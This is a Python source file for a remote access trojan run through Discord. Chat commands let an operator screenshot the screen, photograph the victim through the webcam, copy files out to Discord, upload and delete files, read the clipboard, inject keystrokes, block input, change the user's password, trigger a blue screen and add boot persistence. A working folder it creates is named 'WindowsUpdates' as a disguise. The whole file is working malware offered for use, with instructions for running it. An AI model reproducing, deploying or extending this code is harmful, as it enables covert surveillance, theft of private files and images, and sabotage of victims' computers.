import discord
import os
import libs.computer as pc
import libs.powershell as pw
import sys
from shutil import copy;
import winshell
from win32com.client import Dispatch

#TODO
# - Add more commands
# - Fix boot persistence


modules_path = os.getcwd() + "\modules"
client = discord.Client(intents=discord.Intents.all())
#boot_path = os.getenv("APPDATA") + "\Microsoft\Windows\Start Menu\Programs\Startup"

def load_modules():
    for module in os.listdir(modules_path):
        if module.endswith(".py"):
            print(f"py {modules_path}\{module}")
            os.system(f"py {modules_path}\{module}")

def list_modules():
    modules = ""
    for module in os.listdir(modules_path):
        if module.endswith(".py"):
            modules += module + "\n"
    return modules

@client.event
async def on_ready():
    print(f"Bot started. Version: " + "1.0.6")
    if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
    """
    if os.path.exists(f"{boot_path}\Run.lnk") == False:
        target = __file__
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(f"{boot_path}\Run.lnk")
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = target
        shortcut.save()
    """

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    #HELP
    if message.content.startswith(".help"):
        await message.delete()
        commandlist = """
            .pcinfo - Fetch information about the computer using the systeminfo command in command prompt.
            .hardware - Fetch information about the computer's hardware using WMIC. [GPU/CPU Name, HWID, RAM Capacity, Disk Capacity]
            .shutdown - Shutdown the computer.
            .dir - List the specified directory's files. Usage: .dir <full path>
            .tasklist - List all tasks with a specific name. Usage: .tasklist <program name>. Example: .tasklist opera.exe
            .taskkill - Kill a specified task. Usage: .taskkill <PID>
            .screenshot - Take a screenshot.
            .open - Open a specified file. Usage: .open <full file path>. Example: .open c:/Users/user/Desktop/textfile.txt
            .copy - Copy a specified file. Usage: .copy <full file path>. Example: .copy c:/Users/user/Desktop/textfile.txt
            .bsod - Trigger a BSOD.
            .changepassword - Change the user's password. Usage: .changepassword <new password>
            .webcam - Take a picture using the webcamera.
            .logout - Logout the user from the computer.
            .delete - Delete a specified file. Usage: .delete <full file path>. Example: .delete c:/Users/user/Desktop/textfile.txt
            .upload - Upload a file to the computer. Usage: .upload <full file path>. You need to use the file that you want to upload as message attachment. Example: .upload c:/Users/user/Desktop/textfile.txt <attachment>
            .hid - Siumlates keyboard. Usage: .hid write <text> - writes text, .hid press <key> - simulates keypress, .hid hotkey <key1> <key2> - simulates keypresses of key1 and key2 at the same time.
            Examples: .hid write hello there - writes "hello there", .hid press enter - simulates keypress of enter key, .hid hotkey win r - simulates hotkey win + r.
            .blockinput - Block all input from the user's keyboard and mouse.
            .unblockinput - Unblock all input from the user's keyboard and mouse.
            .selfdestruct - Run a .bat file that removes the bot and all it's features from the computer.
            .deletedir - Delete a directory. Usage: .deletedir <full dir path>. Example: .deletedir c:/Users/user/Desktop/MyFolder BROKEN
            .createdir - Create a directory. Usage: .createdir <new dir path>. Example .createdir c:/Users/user/Desktop/MyNewFolder
            .modules - List/run modules in the /modules folder. Usage: .modules <list/load> BROKEN
        """
        embed = discord.Embed(title="Command list", description=commandlist)
        await message.channel.send(embed=embed)

    #SELF DESTRUCT
    if message.content.startswith(".selfdestruct"):
        await message.delete()
        embed = discord.Embed(title="Self Destruct", description="Attempting to self destruct...")
        await message.channel.send(embed=embed)
        pc.self_destruct()
        embed = discord.Embed(title="Self Destruct successful")
        await message.channel.send(embed=embed)
        quit()

    #COMPUTER INFORMATION
    if message.content.startswith(".pcinfo"):
        await message.delete()
        await message.channel.send(embed=pc.comp_info()[0])
        await message.channel.send(file=pc.comp_info()[1])
        os.rmdir("pc_info.txt")

    #SHUTDOWN
    if message.content.startswith(".shutdown"):
        await message.delete()
        embed = discord.Embed(title="Shutdown", description="Attempting to shutdown...")
        await message.channel.send(embed=embed)
        try:
            pc.pc_shutdown()
        except:
            embed = discord.Embed(title="Shutdown", description="Failed to shutdown.")
        await message.channel.send(embed=embed)

    #HARDWARE INFORMATION
    if message.content.startswith(".hardware"):
        await message.delete()
        embed = discord.Embed(title="Hardware Information", description=pc.hardware_info(), color=0x00ff00)
        await message.channel.send(embed=embed)

    #DIR
    if message.content.startswith(".dir"):
        directory = message.content.replace(".dir ", "")
        await message.delete()
        try:
            result = pw.dir(directory)
        except Exception as e  :
            print(e)
            embed = discord.Embed(title="Directory", description="Failed to get directory. Usage .dir c:", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Directory", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #OPEN FILE
    if message.content.startswith(".open"):
        file_path = message.content.replace(".open ", "")
        await message.delete()
        try:
            os.startfile(file_path)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Open File", description="Failed to open file.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Open File", description="File opened.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #UPLOAD FILE
    if message.content.startswith(".upload"):
        try:
            directory = (message.content.replace(".dir ", "")).split(" ")[1]
        except:
            embed = discord.Embed(title="Upload failed", description="No directory specified. To upload in curent direcotry use ./", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        await message.delete()
        if message.attachments:
            for attachment in message.attachments:
                try:
                    await attachment.save(f'{directory}/{attachment.filename}')
                    embed = discord.Embed(title="Upload succesfull", description=f"File {attachment.filename} uploaded.", color=0x00ff00)
                except Exception as e:
                    print(e)
                    embed = discord.Embed(title="Upload failed", description="Failed to upload file.", color=0x00ff00)
        else:
            embed = discord.Embed(title="Upload failed", description="No file attached.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #TASKLIST - TO FIX
    if message.content.startswith(".tasklist"):
        process = message.content.replace(".tasklist ", "")
        await message.delete()
        try:
            result = pw.tasklist(process)
            print(result)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Tasklist", description="Failed to get tasklist.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Tasklist", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #TASKKILL
    if message.content.startswith(".taskkill"):
        task = message.content.replace(".taskkill ", "")
        result = ""
        await message.delete()
        try:
            result = pw.taskkill(task)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Taskkill", description="Failed to kill task.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Taskkill", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #SCREENSHOT
    if message.content.startswith(".screenshot"):
        await message.delete()
        try:
            sc = pc.screenshot()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Screenshot", description="Failed to take screenshot.", color=0x00ff00)
            return
        embed = discord.Embed(title="Screenshot", description="Screenshot taken.", color=0x00ff00)
        await message.channel.send(file=discord.File(sc), embed=embed)

    #COPY
    if message.content.startswith(".copy"):
        try:
            loc = message.content.replace(".copy ", "")
            await message.delete()
            embed = discord.Embed(title="Copy", description="File copied.", color=0x00ff00)
            await message.channel.send(file=discord.File(loc),embed=embed)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Copy", description="Failed to copy file.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
    
    #BSOD
    if message.content.startswith(".bsod"):
        await message.delete()
        try:
            pc.bsod()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="BSOD", description="Failed to BSOD.", color=0x00ff00)
            return
        embed = discord.Embed(title="BSOD", description="BSOD Executed.", color=0x00ff00)
        await message.channel.send(embed=embed)
    
    #CHANGE PASSWORD
    if message.content.startswith(".changepassword"):
        await message.delete()
        try:
            pc.change_password(message.content.replace(".changepassword ", ""))
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Change Password", description="Failed to change password.", color=0x00ff00)
            return
        embed = discord.Embed(title="Change Password", description="Password changed.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #WEBCAMSHOT
    if message.content.startswith(".webcam"):
        await message.delete()
        try:
            wc = pc.webcamshot()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Webcamshot", description="Failed to take webcamshot.", color=0x00ff00)
            return
        embed = discord.Embed(title="Webcamshot", description="Webcamshot taken.", color=0x00ff00)
        await message.channel.send(embed=embed,file=discord.File(wc))

    #LOGOUT
    if message.content.startswith(".logout"):
        await message.delete()
        embed = discord.Embed(title="Logout", description="Logging out...", color=0x00ff00)
        await message.channel.send(embed=embed)
        os.system("shutdown -l")

    #DELETE
    if message.content.startswith(".delete") and not message.content.startswith(".deletedir"):
        file_path = message.content.replace(".delete ", "")
        await message.delete()
        try:
            os.remove(file_path)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Delete", description="Failed to delete file.", color=0x00ff00)
            return
        embed = discord.Embed(title="Delete", description="File deleted.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #HID
    if message.content.startswith(".hid"):
        await message.delete()
        result = pc.hid(command=message.content.replace(".hid ", ""))
        embed = discord.Embed(title="HID", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #BLOCK INPUT
    if message.content.startswith(".blockinput"):
        await message.delete()
        try:
            pc.block_input()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Block Input", description="Failed to block input.", color=0x00ff00)
            return
        embed = discord.Embed(title="Block Input", description="Input blocked.", color=0x00ff00)
        await message.channel.send(embed=embed)
    
    #UNBLOCK INPUT
    if message.content.startswith(".unblockinput"):
        await message.delete()
        try:
            pc.unblock_input()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Unblock Input", description="Failed to unblock input.", color=0x00ff00)
            return
        embed = discord.Embed(title="Unblock Input", description="Input unblocked.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #DELETE DIR
    if message.content.startswith(".deletedir"):
        path = message.content.replace(".deletedir ", "")
        await message.delete()
        try:
            os.rmdir(path)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Delete Directory", description="Failed to delete directory.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Delete Directory", description="Directory deleted.", color=0x00ff00)
        await message.channel.send(embed=embed)
        
    
    #CREATE DIR
    if message.content.startswith(".createdir"):
        await message.delete()
        try:
            os.mkdir(message.content.replace(".createdir ", ""))
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Create Directory", description="Failed to create directory. Usage: ``.createdir <FULL DIRECTORY PATH>``", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Create Directory",description=f"Directory {message.content.replace('.createdir ', '')} created.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #RUN MODULES
    if message.content.startswith(".modules"):
        try:
            arg = message.content.split(" ")[1]
        except:
            embed = discord.Embed(title="Modules", description="No argument given.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        await message.delete()
        
        if arg == "list":
            embed = discord.Embed(title="Modules", description=list_modules(), color=0x00ff00)
            await message.channel.send(embed=embed)

        elif arg == "load":
            try:
                load_modules()
            except Exception as e:
                print(e)
                embed = discord.Embed(title="Modules", description="Failed to load modules.", color=0x00ff00)
                await message.channel.send(embed=embed)
                return

            embed = discord.Embed(title="Modules", description="Modules loaded.", color=0x00ff00)
            await message.channel.send(embed=embed)
        else:
            embed = discord.Embed(title="Modules", description="Invalid argument.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

    #PERSISTENCE
    if message.content.startswith(".boot"):
        await message.delete()
        try:
            pc.bootup()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Bootup", description="Failed to add persistence.", color=0x00ff00)
            return
    
    #CLIPBOARD
    if message.content.startswith(".clipboard"):
        arg = message.content.split(" ")[1]
        await message.delete()
        if arg == "get":
            cb = pc.get_clipboard()
            embed = discord.Embed(title="Clipboard", description=cb, color=0x00ff00)
            await message.channel.send(embed=embed)
        elif arg == "set":
            text = message.content.replace(".clipboard set ", "")
            pc.set_clipboard(text)
            embed = discord.Embed(title="Clipboard", description="Clipboard set.", color=0x00ff00)
            await message.channel.send(embed=embed)

token = sys.argv[1]
client.run(token)
#use py main.py <token> to run
